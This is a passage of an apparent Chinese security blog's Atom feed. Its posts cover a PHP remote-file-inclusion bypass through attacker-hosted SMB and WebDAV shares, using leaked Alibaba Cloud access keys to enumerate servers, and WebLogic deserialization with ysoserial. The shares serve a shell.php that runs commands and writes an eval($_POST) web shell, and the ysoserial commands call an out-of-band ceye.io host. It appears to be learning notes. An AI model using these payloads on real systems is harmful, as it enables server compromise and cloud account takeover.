<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h1tler&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.cuittk.cn/"/>
  <updated>2020-04-01T08:29:26.629Z</updated>
  <id>https://blog.cuittk.cn/</id>
  
  <author>
    <name>h1tler</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RFI绕过url协议限制getshell</title>
    <link href="https://blog.cuittk.cn/2020/04/01/RFI%E7%BB%95%E8%BF%87url%E5%8D%8F%E8%AE%AE%E9%99%90%E5%88%B6getshell/"/>
    <id>https://blog.cuittk.cn/2020/04/01/RFI绕过url协议限制getshell/</id>
    <published>2020-04-01T03:45:30.882Z</published>
    <updated>2020-04-01T08:29:26.629Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RFI绕过url协议限制getshell"><a href="#RFI绕过url协议限制getshell" class="headerlink" title="RFI绕过url协议限制getshell"></a>RFI绕过url协议限制getshell</h2><p>远程文件包含漏洞利用条件需要开启allow_url_fopen、allow_url_include都为On</p><pre><code class="language-html">allow_url_fopen=Onallow_url_include=On</code></pre><p>但是php版本自从<code>php 5.2</code>以后allow_url_include默认为Off，导致无法getshell<br>php 5.6.x 的php.ini配置</p><pre><code class="language-html">;;;;;;;;;;;;;;;;;;; Fopen wrappers ;;;;;;;;;;;;;;;;;;;; Whether to allow the treatment of URLs (like http:// or ftp://) as files.; http://php.net/allow-url-fopenallow_url_fopen = On; Whether to allow include/require to open URLs (like http:// or ftp://) as files.; http://php.net/allow-url-includeallow_url_include = Off</code></pre><h3 id="RFI-基础"><a href="#RFI-基础" class="headerlink" title="RFI 基础"></a>RFI 基础</h3><p>PHP中引发文件包含漏洞的通常主要是以下四个函数：<br>include()<br>include_once()<br>require()<br>require_once()</p><h4 id="include"><a href="#include" class="headerlink" title="include()"></a>include()</h4><p>include() 函数包含出错的话，只会提出警告，不会影响后续语句的执行<br><img src="http://img.cdn.cuittk.cn/x72p8ix61a5lvw9ekdidajfhto.png" alt=""></p><h4 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h4><p>require() 函数包含出错的话，则会直接退出，后续语句不在执行<br><img src="http://img.cdn.cuittk.cn/jexeudn60cp1ro4ikodwu9oyfo.png" alt=""></p><h4 id="include-once-和-require-once"><a href="#include-once-和-require-once" class="headerlink" title="include_once() 和 require_once()"></a>include_once() 和 require_once()</h4><p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它。once就是一次的意思。<br><img src="http://img.cdn.cuittk.cn/yslfayum5wnx9az1hw7hxkkg74.png" alt=""></p><h3 id="RFI-缺陷"><a href="#RFI-缺陷" class="headerlink" title="RFI 缺陷"></a>RFI 缺陷</h3><p>php.ini中可以看到 allow_url_fopen和allow_url_include主要是针对两种协议起作用：http://、 ftp://<br>使用其他协议绕过，例如<code>SMB</code>、<code>WebDAV</code>等协议。</p><h3 id="RFI-绕过—SMB协议"><a href="#RFI-绕过—SMB协议" class="headerlink" title="RFI 绕过—SMB协议"></a>RFI 绕过—SMB协议</h3><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><pre><code class="language-php">&lt;?php    $file=$_GET[&#39;file&#39;];    include $file;?&gt;</code></pre><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><pre><code class="language-html">unc -&gt; smb</code></pre><h4 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h4><p>当易受攻击的PHP应用程序代码尝试从攻击者控制的SMB服务器共享加载PHP Web shell时，SMB共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP Web shell，SMB服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>首先，重新配置PHP环境，在php.ini文件中禁用allow_url_fopen以及allow_url_include。然后，配置SMB服务器具有匿名读访问权限。</p><h5 id="PHP环境设置"><a href="#PHP环境设置" class="headerlink" title="PHP环境设置"></a>PHP环境设置</h5><p>首先，在受害者主机上配置php.ini，将allow_url_fopen和allow_url_include设置为Off，重启生效。<br><img src="http://img.cdn.cuittk.cn/zd9hafkeh5lsdp7u5f0d6d9ebf.png" alt=""></p><h5 id="SAMBA服务器环境配置"><a href="#SAMBA服务器环境配置" class="headerlink" title="SAMBA服务器环境配置"></a>SAMBA服务器环境配置</h5><p>需要使用匿名读取访问权限配置SAMBA服务器（Ubuntu18.04）</p><pre><code class="language-html">Samba是在Linux和UNIX系统上实现SMB协议的一个软件</code></pre><p>（1）安装SAMBA服务器</p><pre><code class="language-html">apt-get install samba</code></pre><p>（2）创建SMB共享目录和 php webshell</p><pre><code class="language-html">mkdir /var/www/html/pub/touch /var/www/html/pub/shell.php</code></pre><p><img src="http://img.cdn.cuittk.cn/m721406z6758ke3p0scb10dx6r.png" alt=""><br>（3）配置新创建的SMB共享目录的权限</p><pre><code class="language-html">chmod 0555 /var/www/html/pub/chown -R nobody:nogroup /var/www/html/pub/</code></pre><p><img src="http://img.cdn.cuittk.cn/fo9y7n03h93327brs7k3amglgc.png" alt=""><br>（4）编辑samba配置文件<code>/etc/samba/smb.conf</code><br>运行以下提到的命令以删除SAMBA服务器配置文件的默认内容</p><pre><code class="language-html">echo &gt; /etc/samba/smb.conf#再编辑配置文件vim /etc/samba/smb.conf</code></pre><p>将下面的内容放在/etc/samba/smb.conf文件中</p><pre><code class="language-html">[global]workgroup = WORKGROUPserver string = Samba Server %vnetbios name = indishell-labsecurity = usermap to guest = bad username resolve order = bcast hostdns proxy = nobind interfaces only = yes[ethan]path = /var/www/html/pubwritable = noguest ok = yesguest only = yesread only = yesdirectory mode = 0555force user = nobody</code></pre><p>（5）重新启动SAMBA服务器以应用配置文件/etc/samba/smb.conf中的新配置</p><pre><code class="language-html">service smbd restart</code></pre><p>比如，SAMBA服务器IP是192.168.23.129，我需要访问Windows文件浏览器中的SMB共享，如下：</p><pre><code class="language-html">\\192.168.23.129\</code></pre><p><img src="http://img.cdn.cuittk.cn/7zhtv2hxn25fuqruer8zbfehcw.png" alt=""></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>在环境都配置完且验证之后，利用samba目录/var/www/html/pub中共享的WebShell进行GetShell<br><code>payload</code></p><pre><code class="language-html">http://127.0.0.1/index.php?file=\\192.33.6.145\ethan\shell.php</code></pre><p><img src="http://img.cdn.cuittk.cn/xrti0v3xrufmvlxpmmfoqf35fj.png" alt=""></p><h4 id="停用samba"><a href="#停用samba" class="headerlink" title="停用samba"></a>停用samba</h4><pre><code>/etc/init.d/samba stop</code></pre><h4 id="SMB总结"><a href="#SMB总结" class="headerlink" title="SMB总结"></a>SMB总结</h4><p>针对smb利用的局限性，因为这种unc只能是在windows下使用，而且，smb端口(445) 在国内已经被封杀的差不多了（勒索病毒！！！），很难应用到实际中，但是其他的像webdav这种同理也是可以被包含的，且利用的价值更大。</p><h3 id="RFI-绕过—WebDAV协议"><a href="#RFI-绕过—WebDAV协议" class="headerlink" title="RFI 绕过—WebDAV协议"></a>RFI 绕过—WebDAV协议</h3><p>WebDAV（Web 分布式创作和版本管理）是一项基于 HTTP/1.1 协议的通信协议。它扩展了HTTP/1.1 协议，在Get、Post、Put、Delete 等HTTP标准方法外添加了新方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)和解锁(Unlock)，以及文件的版本控制。</p><h4 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h4><pre><code class="language-php">&lt;?php    $file=$_GET[&#39;file&#39;];    include $file;?&gt;</code></pre><h4 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h4><pre><code class="language-html">类unc -&gt; WebDAV</code></pre><h4 id="攻击场景-1"><a href="#攻击场景-1" class="headerlink" title="攻击场景"></a>攻击场景</h4><p>当易受攻击的PHP应用程序代码尝试从攻击者控制的WebDAV服务器共享加载PHP Web shell时，WebDAV共享应该允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的WebDAV服务器。因此，一旦易受攻击的应用程序尝试从WebDAV共享访问PHP Web shell，WebDAV服务器将不会要求任何凭据，易受攻击的应用程序将包含Web shell的PHP代码。</p><h4 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h4><p>PHP环境设置，同样设置为Off。</p><h5 id="WebDAV服务器环境配置"><a href="#WebDAV服务器环境配置" class="headerlink" title="WebDAV服务器环境配置"></a>WebDAV服务器环境配置</h5><p>需要使用匿名读取访问权限配置WebDAV服务器。</p><p>1、Ubuntu18.04手动搭建WebDAV服务器<br>（1）安装Apache Web服务器</p><pre><code class="language-html">sudo apt-get install -y apache2</code></pre><p>（2）在Apache配置中启用WebDAV模块</p><pre><code class="language-html">sudo a2enmod davsudo a2enmod dav_fs</code></pre><p><img src="http://img.cdn.cuittk.cn/qlw3sn5a98i4f8gcumtae0135l.png" alt=""></p><p>（3）创建WebDAV共享目录webdav和 php webshell</p><pre><code class="language-html">sudo mkdir -p /var/www/html/webdavsudo touch /var/www/html/webdav/shell.php</code></pre><p><img src="http://img.cdn.cuittk.cn/8kjbjb0l83tprf9ew5anoe15ue.png" alt=""><br>（4）将文件夹所有者更改为您的Apache用户，www-data以便Apache具有对该文件夹的写访问权</p><pre><code class="language-html">sudo chown -R www-data:www-data  /var/www/</code></pre><p><img src="http://img.cdn.cuittk.cn/c54dizr85z4wva2tqraxtag5bf.png" alt=""></p><p>（5）编辑WebDAV配置文件</p><pre><code class="language-html">vim /etc/apache2/sites-available/000-default.conf</code></pre><p>不需要启用身份验证，在<code>&lt;/VirtualHost&gt;</code>前面添加如下代码</p><pre><code class="language-html">Alias /webdav /var/www/html/webdav &lt;Directory /var/www/html/webdav&gt;     DAV On &lt;/Directory&gt;</code></pre><p><img src="http://img.cdn.cuittk.cn/n8hfgghfuncj77gnlo46hqs2it.png" alt=""><br>（6）重新启动Apache服务器，以使更改生效</p><pre><code class="language-html">sudo service apache2 restart</code></pre><p>成功重新启动Apache服务器后，尝试访问WebDAV共享并确保WebDAV服务器不要求凭据。<br><img src="http://img.cdn.cuittk.cn/mlv2wjc8a3kjfgd7zw045oh6w2.png" alt=""></p><p>除了上面在Ubuntu上一步步安装WebDAV服务器外，还可以利用做好的Docker镜像。</p><p>2、WebDAV Docker镜像</p><p>推荐使用Docker镜像方式去安装利用，免去一些因环境或配置不当而产生的问题</p><p>（1）拉取webdav镜像<br>镜像地址：<a href="https://hub.docker.com/r/bytemark/webdav" target="_blank" rel="external">https://hub.docker.com/r/bytemark/webdav</a></p><pre><code class="language-html">docker pull bytemark/webdav</code></pre><p>（2）用docker启动一个webdav服务器</p><pre><code class="language-html">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</code></pre><p>（3）在~/webdav/data目录里面共享自己php脚本<br><img src="http://img.cdn.cuittk.cn/irvguca7f6o5hncx1pmbmdvkdf.png" alt=""></p><h4 id="Getshell-1"><a href="#Getshell-1" class="headerlink" title="Getshell"></a>Getshell</h4><p>payload</p><pre><code class="language-html">http://127.0.0.1:8888/index.php?file=\\10.10.10.10//webdav/shell.php</code></pre><p>shell.php</p><pre><code class="language-html">&lt;?php system(&quot;whoami&quot;);phpinfo();?&gt;&lt;?php fputs(fopen(&#39;poc.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[abc])?&gt;&#39;);?&gt;</code></pre><p>为什么这个不能直接加载一句话木马呢，因为使用PHP文件包含函数远程加载Webdav共享文件时，不能附加消息(GET/POST)，但是我们可以自定义shell.php，通过服务器加载远程shell.php给我们自动生成一个Webshell。</p><p><img src="http://img.cdn.cuittk.cn/r62m5z6cmnsl91da1csgzs9gou.png" alt=""><br>从图中可以看到远程加载shell.php利用成功，可以根据状态码分析其加载过程：<br><img src="http://img.cdn.cuittk.cn/0a9odbzh0an0cxoxp1w2dakocg.png" alt=""><br>其中code 207是由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p><h4 id="WebDAV总结"><a href="#WebDAV总结" class="headerlink" title="WebDAV总结"></a>WebDAV总结</h4><p>webdav如今很多人都将其作为自己的个人数据共享存储服务器，其局限性远远小于SMB。</p><h3 id="稳定性比较"><a href="#稳定性比较" class="headerlink" title="稳定性比较"></a>稳定性比较</h3><p>smb协议更稳定些。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>RFI 巧用 WebDAV 绕过 URL 包含限制 Getshell<a href="https://paper.seebug.org/1148/" target="_blank" rel="external">https://paper.seebug.org/1148/</a><br>RFI-SMB <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="external">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;RFI绕过url协议限制getshell&quot;&gt;&lt;a href=&quot;#RFI绕过url协议限制getshell&quot; class=&quot;headerlink&quot; title=&quot;RFI绕过url协议限制getshell&quot;&gt;&lt;/a&gt;RFI绕过url协议限制getshell&lt;/h2&gt;&lt;
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Burp Suite监听代理流量，实现抓取国外站点</title>
    <link href="https://blog.cuittk.cn/2020/03/22/Burp%20Suite%E7%9B%91%E5%90%AC%E4%BB%A3%E7%90%86%E6%B5%81%E9%87%8F%EF%BC%8C%E5%AE%9E%E7%8E%B0%E6%8A%93%E5%8F%96%E5%9B%BD%E5%A4%96%E7%AB%99%E7%82%B9/"/>
    <id>https://blog.cuittk.cn/2020/03/22/Burp Suite监听代理流量，实现抓取国外站点/</id>
    <published>2020-03-22T03:25:07.197Z</published>
    <updated>2020-03-22T04:19:26.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Burp-Suite监听代理流量，实现抓取国外站点"><a href="#Burp-Suite监听代理流量，实现抓取国外站点" class="headerlink" title="Burp Suite监听代理流量，实现抓取国外站点"></a>Burp Suite监听代理流量，实现抓取国外站点</h2><p>需求：想抓取google.com的流量</p><p>我的clash ss代理的端口是7890<br>Burpsuite代理的端口是8080<br>想让浏览器先走burpsuite，再走clash的就可以抓取到国外站点。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>Burpsuite有一个上层代理功能。</p><p>打开Burp Suite之后，找到Project Opitons选项下的Connections子选项，可以看到Upstream Proxy Server这个板块，默认是没勾选的，我们勾选上它。<br><img src="http://img.cdn.cuittk.cn/qd7x7f9gkd0iokfh6wy8hydmfg.png" alt=""></p><p>然后点击“Add”添加一个代理，这里Destination host是要指定使用代理ip的主机，这里我们输入*代表对所有主机使用代理，Proxy host是代理ip，这里我是以SSR举例子，所以我写SSR的本地IP，如果是其他的HTTP代理ip，就直接填写到这里，Proxy port就是端口，SSR的本地端口是7890,所以我这里写7890，其他HTTP代理ip的端口是啥，就写啥，最后一个选项，选择无就好，点击OK之后，就可以</p><p><img src="http://img.cdn.cuittk.cn/1f3kdjhd2eh77s3r2vnyzbueah.png" alt=""></p><p>浏览器设置好代理到burpsuite就可以抓到google.com了。<br><img src="http://img.cdn.cuittk.cn/hs56vrtkr8dunpvbqtu6oyumob.png" alt=""></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.t1h2ua.cn/archives/31" target="_blank" rel="external">https://www.t1h2ua.cn/archives/31</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Burp-Suite监听代理流量，实现抓取国外站点&quot;&gt;&lt;a href=&quot;#Burp-Suite监听代理流量，实现抓取国外站点&quot; class=&quot;headerlink&quot; title=&quot;Burp Suite监听代理流量，实现抓取国外站点&quot;&gt;&lt;/a&gt;Burp Suite监
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>阿里云oss key利用</title>
    <link href="https://blog.cuittk.cn/2020/03/19/%E9%98%BF%E9%87%8C%E4%BA%91oss%20key%E5%88%A9%E7%94%A8/"/>
    <id>https://blog.cuittk.cn/2020/03/19/阿里云oss key利用/</id>
    <published>2020-03-19T13:34:48.845Z</published>
    <updated>2020-03-20T08:58:56.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="阿里云oss-key利用"><a href="#阿里云oss-key利用" class="headerlink" title="阿里云oss key利用"></a>阿里云oss key利用</h2><h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><p>Access Token = AccessKeyId + AccessKeySecret<br>OSS通过使用AccessKeyId和AccessKeySecret对称加密的方法来验证某个请求的发送者身份。<br>阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限。<br>RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限</p><p>STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。</p><h3 id="通过Access-Token接管ECS"><a href="#通过Access-Token接管ECS" class="headerlink" title="通过Access Token接管ECS"></a>通过Access Token接管ECS</h3><p>ECS：云服务器<br>Access Token</p><pre><code>AccessKeyId = ***************AccessKeySecret = **************</code></pre><p><a href="https://help.aliyun.com/document_detail/25506.html?spm=a2c4g.11186623.2.19.6fe81e4awkewkz#doc-api-Ecs-DescribeInstances" target="_blank" rel="external">查看云服务器ECS文档DescribeInstances</a><br>调用DescribeInstances查询一台或多台ECS实例的详细信息。<br><img src="http://img.cdn.cuittk.cn/20zojdyz1lzbypuyi50yy4on7b.png" alt=""><br>点击调试，打开<a href="https://api.aliyun.com/#/?product=Ecs&amp;version=2014-05-26&amp;api=DescribeInstances&amp;tab=DEMO&amp;lang=PYTHON" target="_blank" rel="external">OpenAPI Explorer</a>，即可看到调用SDK的python版本。<br><img src="http://img.cdn.cuittk.cn/dho9ud18bhkyyrqrvk7mlw7ajd.png" alt=""></p><h4 id="安装SDK核心库"><a href="#安装SDK核心库" class="headerlink" title="安装SDK核心库"></a>安装SDK核心库</h4><p><a href="https://help.aliyun.com/document_detail/53090.html?spm=a2c1g.8271268.10000.119.3e0edf25D54pKD" target="_blank" rel="external">安装阿里云 Python SDK 官方文档</a><br>如果您使用Python 2.x，执行以下命令，安装阿里云SDK核心库：</p><pre><code class="language-html">pip install aliyun-python-sdk-core</code></pre><p>如果您使用Python 3.x，执行以下命令，安装阿里云SDK核心库：</p><pre><code class="language-html">pip install aliyun-python-sdk-core-v3</code></pre><h4 id="安装云产品的SDK"><a href="#安装云产品的SDK" class="headerlink" title="安装云产品的SDK"></a>安装云产品的SDK</h4><pre><code class="language-html">pip install aliyun-python-sdk-ecs</code></pre><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><pre><code class="language-html">#!/usr/bin/env python#coding=utf-8from aliyunsdkcore.client import AcsClientfrom aliyunsdkcore.acs_exception.exceptions import ClientExceptionfrom aliyunsdkcore.acs_exception.exceptions import ServerExceptionfrom aliyunsdkecs.request.v20140526.DescribeInstancesRequest import DescribeInstancesRequestclient = AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-hangzhou&#39;)request = DescribeInstancesRequest()request.set_accept_format(&#39;json&#39;)response = client.do_action_with_exception(request)# python3:  print(str(response, encoding=&#39;utf-8&#39;))print(response)</code></pre><p><img src="http://img.cdn.cuittk.cn/u25t8i7izsx4u3vwj3dwpzx426.png" alt=""></p><h4 id="执行shell"><a href="#执行shell" class="headerlink" title="执行shell"></a>执行shell</h4><p><a href="https://help.aliyun.com/document_detail/64844.html" target="_blank" rel="external">https://help.aliyun.com/document_detail/64844.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;阿里云oss-key利用&quot;&gt;&lt;a href=&quot;#阿里云oss-key利用&quot; class=&quot;headerlink&quot; title=&quot;阿里云oss key利用&quot;&gt;&lt;/a&gt;阿里云oss key利用&lt;/h2&gt;&lt;h3 id=&quot;Access-Token&quot;&gt;&lt;a href=&quot;#A
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java Web安全学习笔记</title>
    <link href="https://blog.cuittk.cn/2020/03/11/JavaWeb%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.cuittk.cn/2020/03/11/JavaWeb安全学习笔记/</id>
    <published>2020-03-11T09:26:24.544Z</published>
    <updated>2020-03-11T09:26:38.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-Web安全学习笔记"><a href="#Java-Web安全学习笔记" class="headerlink" title="Java Web安全学习笔记"></a>Java Web安全学习笔记</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Java-Web安全学习笔记&quot;&gt;&lt;a href=&quot;#Java-Web安全学习笔记&quot; class=&quot;headerlink&quot; title=&quot;Java Web安全学习笔记&quot;&gt;&lt;/a&gt;Java Web安全学习笔记&lt;/h2&gt;
      
    
    </summary>
    
      <category term="Java安全" scheme="https://blog.cuittk.cn/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Weblogic反序列化历史漏洞汇总</title>
    <link href="https://blog.cuittk.cn/2020/03/10/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"/>
    <id>https://blog.cuittk.cn/2020/03/10/Weblogic反序列化历史漏洞汇总/</id>
    <published>2020-03-10T12:25:22.193Z</published>
    <updated>2020-03-11T14:38:03.947Z</updated>
    
    <content type="html"><![CDATA[<h3 id="反序列化概述"><a href="#反序列化概述" class="headerlink" title="反序列化概述"></a>反序列化概述</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>Java 序列化是指把 Java 对象转换为字节序列的过程，便于保存在内存、文件、数据库中。反序列化是指把字节序列恢复为 Java 对象的过程。<br>ObjectOutputStream类的 writeObject() 方法可以实现序列化。<br>ObjectInputStream 类的 readObject() 方法用于反序列化。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre><code class="language-java">public class test{    public static void main(String args[]) throws Exception{    //定义obj对象    String obj = &quot;hello world!&quot;;    }}</code></pre><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>1、http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等<br>2、ServletsHTTP，Sockets，Session管理器包含的协议就包括JMX，RMI，JMS，JNDI等（\xac\xed）<br>3、xmlXstream,XMLDecoder等（HTTP Body：Content-Type:application/xml）<br>4、json(Jackson，fastjson) http请求中包含</p><h3 id="漏洞研究环境"><a href="#漏洞研究环境" class="headerlink" title="漏洞研究环境"></a>漏洞研究环境</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>1、官网安装<br>注册账号，下载地址<br><a href="http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html" target="_blank" rel="external">http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html</a><br>2、Docker 安装<br>直接用Vulhub的镜像<br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271" target="_blank" rel="external">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271</a><br>安装完毕版本是 10.3.6.0，配置运行信息在地址内有详细说明。</p><h4 id="Ysoserial——集合各种java反序列化payload"><a href="#Ysoserial——集合各种java反序列化payload" class="headerlink" title="Ysoserial——集合各种java反序列化payload"></a>Ysoserial——集合各种java反序列化payload</h4><p>1、介绍<br>Ysoserial是国外一款安全工具，集合了各种java反序列化payload，下载地址：<br><a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="external">https://github.com/frohoff/ysoserial/</a></p><p>可见其有CommonsCollections、Groovy1、Jdk7u21、Spring等常见payload。通过对该攻击代码的分析，可以学习巧妙的构造方法和共同的利用特性：具体的payload分析见：<br><a href="http://www.vuln.cn/6295" target="_blank" rel="external">http://www.vuln.cn/6295</a></p><p>2、使用方法<br>2.1、在公网上选择一个端口进行流量监听：</p><pre><code class="language-html">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1  &#39;ping -c 2  rce.267hqw.ceye.io&#39;</code></pre><p>2.2、客户端发送payload</p><pre><code class="language-html">python exploit.py 118.89.53.139 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 118.89.53.139  1099 JRMPClient</code></pre><p>解释：JRMPListener 是 ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据发送到 Server 中，然后Server 中进行反序列化操作，并开启指定端口，然后在通过 JRMPClient 去发送攻击 payload。</p><h4 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h4><h5 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h5><p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p><h5 id="RMI和JRMP协议"><a href="#RMI和JRMP协议" class="headerlink" title="RMI和JRMP协议"></a>RMI和JRMP协议</h5><p>RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样，RMI传输过程都使用序列化和反序列化。RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。</p><h5 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h5><p>WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。</p><h3 id="Weblogic反序列化漏洞汇总"><a href="#Weblogic反序列化漏洞汇总" class="headerlink" title="Weblogic反序列化漏洞汇总"></a>Weblogic反序列化漏洞汇总</h3><p>Weblogic反序列化高危漏洞主要涉及到两个种类：<br>1、利用xml decoded反序列化进行远程代码执行的漏洞，例如：<br>CVE-2017-3506、CVE-2017-10271。<br>2、利用java反序列化进行远程代码执行的漏洞，例如：<br>CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628、CVE-2018-2894</p><h4 id="xml-decoded反序列化RCE"><a href="#xml-decoded反序列化RCE" class="headerlink" title="xml decoded反序列化RCE"></a>xml decoded反序列化RCE</h4><h5 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h5><p>漏洞在WLS-WebServices这个组件中，基于WLS wsat模块，核心就是XMLDecoder的反序列化漏洞，Java 调用XMLDecoder解析XML文件的时候，存在命令执行漏洞。也是之前一段时间市面上挖矿主力军。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>weblogic 反序列化<br>Weblogic反序列化历史漏洞全汇总 <a href="https://cloud.tencent.com/developer/article/1516342" target="_blank" rel="external">https://cloud.tencent.com/developer/article/1516342</a><br>WebLogic 反序列化漏洞(CVE-2019-2890)分析<a href="https://paper.seebug.org/1069/" target="_blank" rel="external">https://paper.seebug.org/1069/</a><br>WebLogic反序列化漏洞CVE-2018-2628复现与EXP构造<br><a href="https://www.freebuf.com/vuls/169420.html" target="_blank" rel="external">https://www.freebuf.com/vuls/169420.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;反序列化概述&quot;&gt;&lt;a href=&quot;#反序列化概述&quot; class=&quot;headerlink&quot; title=&quot;反序列化概述&quot;&gt;&lt;/a&gt;反序列化概述&lt;/h3&gt;&lt;h4 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="Java安全" scheme="https://blog.cuittk.cn/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>邮件欺诈之SPF</title>
    <link href="https://blog.cuittk.cn/2020/02/26/%E9%82%AE%E4%BB%B6%E6%AC%BA%E8%AF%88%E4%B9%8BSPF/"/>
    <id>https://blog.cuittk.cn/2020/02/26/邮件欺诈之SPF/</id>
    <published>2020-02-26T06:46:19.541Z</published>
    <updated>2020-02-26T07:40:26.674Z</updated>
    
